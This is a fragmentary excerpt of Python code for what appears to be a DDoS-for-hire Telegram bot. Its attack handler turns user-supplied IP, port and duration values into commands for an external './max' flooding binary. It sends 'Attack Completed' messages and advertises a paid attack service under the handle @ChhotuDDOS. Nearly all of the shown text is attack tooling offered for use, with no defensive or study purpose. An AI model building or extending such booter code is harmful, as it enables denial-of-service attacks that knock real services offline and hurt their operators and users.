...
# Database Configuration Bsdk credit de @ChhotuDDOS
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./max {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./max {ip} {port} {duration} 90"
    elif argument_type == 5:
        attack_command = f"./max {ip} {port} {duration} 150"
...
async def run_attack(chat_id, attack_command, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*BUY PAID SERVICE:- @ChhotuDDOS ATTACK TIME 1200sec*", parse_mode='Markdown')
